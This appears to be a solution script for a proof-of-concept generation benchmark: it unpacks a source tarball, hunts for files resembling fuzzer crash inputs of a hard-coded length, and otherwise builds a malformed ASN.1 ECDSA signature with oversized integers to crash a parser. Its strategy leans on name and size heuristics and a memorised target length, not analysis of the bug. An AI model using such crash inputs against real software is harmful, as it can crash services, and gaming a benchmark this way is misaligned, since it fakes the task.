import os
import tarfile
import tempfile
import sys
from typing import Optional


def _safe_extract(tar: tarfile.TarFile, path: str) -> None:
    base_path = os.path.abspath(path)
    for member in tar.getmembers():
        member_path = os.path.join(path, member.name)
        abs_member_path = os.path.abspath(member_path)
        if not (abs_member_path == base_path or abs_member_path.startswith(base_path + os.sep)):
            continue
        tar.extract(member, path)


def _is_text_like(sample: bytes) -> bool:
    if not sample:
        return True
    nontext = 0
    for b in sample:
        if b in (9, 10, 13):
            continue
        if 32 <= b <= 126:
            continue
        nontext += 1
        if nontext > len(sample) * 0.30:
            return False
    return True


def _find_candidate_poc(root_dir: str, target_len: int) -> Optional[str]:
    positive_name_patterns = [
        "poc", "crash", "exploit", "id_", "id-", "fuzz",
        "seed", "input", "testcase", "oss-fuzz", "clusterfuzz",
        "bug", "sig", "ecdsa", "asn1", "der"
    ]
    negative_name_patterns = [
        "readme", "changelog", "copying", "license"
    ]
    source_exts = {
        ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh",
        ".java", ".py", ".rb", ".php", ".pl", ".cs",
        ".go", ".rs", ".js", ".ts", ".sh", ".bat",
        ".ps1", ".m", ".mm", ".swift", ".kt", ".kts"
    }
    binary_pref_exts = {".der", ".bin", ".dat", ".raw", ".poc", ".asn1", ".sig"}

    best_any_path = None
    best_any_score = None

    best_exact_path = None
    best_exact_score = None

    for dirpath, dirnames, filenames in os.walk(root_dir):
        rel_dir = os.path.relpath(dirpath, root_dir)
        rel_dir_lower = rel_dir.lower()

        dir_bonus = 0
        if any(p in rel_dir_lower for p in ("poc", "crash", "fuzz", "seed", "corpus", "input", "tests", "test", "regress", "cases")):
            dir_bonus += 5000

        for name in filenames:
            path = os.path.join(dirpath, name)
            try:
                size = os.path.getsize(path)
            except OSError:
                continue
            if size == 0:
                continue

            base = abs(size - target_len)
            score = base

            lower = name.lower()
            _, ext = os.path.splitext(lower)

            if any(p in lower for p in negative_name_patterns):
                score += 20000

            if any(p in lower for p in positive_name_patterns):
                score -= 15000

            if ext in source_exts:
                score += 50000

            if ext in binary_pref_exts:
                score -= 10000

            try:
                with open(path, "rb") as f:
                    sample = f.read(2048)
            except OSError:
                continue

            if sample:
                if _is_text_like(sample):
                    score += 1000
                else:
                    score -= 2000

            score -= dir_bonus

            # Track best overall
            if best_any_score is None or score < best_any_score:
                best_any_score = score
                best_any_path = path

            # Track best among exact-length matches
            if size == target_len:
                if best_exact_score is None or score < best_exact_score:
                    best_exact_score = score
                    best_exact_path = path

    if best_exact_path is not None:
        return best_exact_path
    return best_any_path


def _build_generic_ecdsa_poc(total_len: int) -> bytes:
    # Construct a generic ASN.1 ECDSA signature-like structure:
    # SEQUENCE { INTEGER r; INTEGER s; } with oversized integers.
    r_len = 255
    s_len = 255
    r_bytes = b"\x01" * r_len
    s_bytes = b"\x01" * s_len

    r_part = b"\x02" + bytes([r_len]) + r_bytes
    s_part = b"\x02" + bytes([s_len]) + s_bytes
    seq_body = r_part + s_part

    seq_len = len(seq_body)
    if seq_len < 0x80:
        len_bytes = bytes([seq_len])
    elif seq_len <= 0xFF:
        len_bytes = b"\x81" + bytes([seq_len])
    else:
        len_bytes = b"\x82" + bytes([(seq_len >> 8) & 0xFF, seq_len & 0xFF])

    poc = b"\x30" + len_bytes + seq_body

    if total_len <= len(poc):
        return poc[:total_len]
    else:
        padding = b"\x00" * (total_len - len(poc))
        return poc + padding


class Solution:
    def solve(self, src_path: str) -> bytes:
        target_len = 41798

        tmp_dir = tempfile.mkdtemp(prefix="poc_extract_")
        try:
            with tarfile.open(src_path, "r:*") as tar:
                _safe_extract(tar, tmp_dir)
        except Exception:
            return _build_generic_ecdsa_poc(target_len)

        poc_path = _find_candidate_poc(tmp_dir, target_len)
        if poc_path is not None:
            try:
                with open(poc_path, "rb") as f:
                    return f.read()
            except Exception:
                pass

        return _build_generic_ecdsa_poc(target_len)


if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.stderr.write("Usage: python solution.py <src_tarball>\n")
        sys.exit(1)
    solver = Solution()
    data = solver.solve(sys.argv[1])
    sys.stdout.buffer.write(data)
